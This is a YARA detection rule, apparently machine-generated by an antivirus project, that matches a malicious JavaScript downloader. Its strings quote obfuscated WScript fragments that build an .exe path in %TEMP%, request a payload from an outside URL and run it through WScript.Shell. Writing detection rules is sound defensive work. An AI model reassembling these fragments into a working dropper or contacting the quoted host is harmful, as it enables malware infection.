rule sig_20160328_0cbe09e63563d28e0a8ae71e05a2c4da {
  meta:
    description = "datamaliciousorder - file 20160328_0cbe09e63563d28e0a8ae71e05a2c4da.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "42805aefec8828a914df6bd6fde9e7b28e7b1aaca27ea326763f83fd6aa21685"

  strings:
    $s1  = "function Mokrbfan() {return Jfifpyav[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tN8DDcsNzdw5.exe\";};" fullword ascii
    $s2  = "Llhjfjq[Mfzydo](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Hhjcof](Mjiqpxyp() * 11)} while (Llhjfjq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Jfifpyav = function Mdlps() {return WScript[Pfnikn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hjhqgdzgvm(Avxtsz, Eiyvuxte){return Avxtsz - Eiyvuxte;};" fullword ascii
    $s6  = "function Dyexhfgybc(Munrieqmvz){Jfifpyav[\"Run\"](Munrieqmvz, Kuoscqqi, Kuoscqqi);};" fullword ascii
    $s7  = "function Tfehdnnra() {return ((Noegyeb == true) && (Noegyeb == Rlwwjeny)) ? 1 : Kuoscqqi;};" fullword ascii
    $s8  = "var Mkepoaug = new this[\"Date\"]();" fullword ascii
    $s9  = "function Mjiqpxyp(){return 22;};" fullword ascii
    $s10 = "var Noegyeb = false;" fullword ascii
    $s11 = "function Sujqb(){return Pfnikn;};" fullword ascii
    $s12 = "Noegyeb = true; " fullword ascii
    $s13 = "function Abxunbs()" fullword ascii
    $s14 = "var Rlwwjeny = false;" fullword ascii
    $s15 = "var Rpzpms = false;" fullword ascii
    $s16 = "function Lkjmkueom(){return Cfqscmplzc;};" fullword ascii
    $s17 = "Rlwwjeny = true; " fullword ascii
    $s18 = " while (Wvwsez){" fullword ascii
    $s19 = "return Hjhqgdzgvm(Pchxwf, Tyocfnylt);" fullword ascii
    $s20 = "function Bzqrpyhjmu(Rrynahzyly) {var Whussz = (1, 2, 3, 4, 5, Rrynahzyly); return Whussz;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}